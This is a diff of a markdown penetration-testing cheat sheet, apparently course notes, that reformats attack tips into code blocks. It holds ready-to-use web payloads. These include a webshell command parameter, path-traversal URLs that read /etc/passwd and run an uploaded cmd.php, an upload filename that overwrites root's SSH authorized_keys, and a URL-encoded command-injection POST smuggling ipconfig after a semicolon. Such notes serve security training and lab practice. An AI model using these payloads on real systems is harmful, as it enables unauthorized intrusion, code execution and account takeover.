@@ -261,9 +261,13 @@ if(isset($_REQUEST['cmd'])){
 
 http://192.168.204.187/uploads/simple-backdoor.evil?cmd=whoami
 ```
-💡 If we can upload a webshell and access it in /uploads - GG! - Can be used with combo with directory traversal / LFI - abuse the upload path in Burp to put it in /var and then access it like here \[[http://240.0.0.1:8000/backend/?view=../../../../../../../../etc/passwd](http://240.0.0.1:8000/backend/?view=../../../../../../../../etc/passwd) [http://240.0.0.1:8000/backend/?view=../../../../../../../../var/cmd.php&cmd=whoami\](Cheat%20sheet%20b2ec1956b01746ed807a1363890b898f.md)](http://240.0.0.1:8000/backend/?view=../../../../../../../../var/cmd.php&cmd=whoami]\(Cheat%20sheet%20b2ec1956b01746ed807a1363890b898f.md\)) 💡 Non executable - Could try to overwrite ssh keys: In burp: filename=../../../../../../../root/.ssh/authorized\_keys 💡 Good place to upload webshells: C:\\xampp\\htdocs\\html-php-backdoor.php We can check this path via phpinfo.php on DOCUMENT\_ROOT \`curl [http://192.168.120.132:45332/phpinfo.php](http://192.168.120.132:45332/phpinfo.php) | grep 'DOCUMENT\_ROOT' | html2text\`💡 If we have something that looks like a direct command on the os - We can try to abuse it with URL encoded ‘;’ / ‘&&’ / ‘&’. Example from course:
-
-curl -X POST --data 'Archive=git%3Bipconfig' [http://192.168.50.189:8000/archive](http://192.168.50.189:8000/archive)
+💡 If we can upload a webshell and access it in /uploads - GG! - Can be used with combo with directory traversal / LFI - abuse the upload path in Burp to put it in /var and then access it like here `http://240.0.0.1:8000/backend/?view=../../../../../../../../etc/passwd`, `http://240.0.0.1:8000/backend/?view=../../../../../../../../var/cmd.php&cmd=whoami`
+💡 Non executable - Could try to overwrite ssh keys: In burp: `filename=../../../../../../../root/.ssh/authorized\_keys `
+💡 Good place to upload webshells: `C:\\xampp\\htdocs\\html-php-backdoor.php` We can check this path via `phpinfo.php` on DOCUMENT\_ROOT  `curl[http://192.168.120.132:45332/phpinfo.php | grep 'DOCUMENT\_ROOT' | html2text`
+💡 If we have something that looks like a direct command on the os - We can try to abuse it with URL encoded ‘`;`’ `/` ‘`&&`’ /‘`&`’. Example from course:
+```bash
+curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
+```
 
 ## Web Shells
 
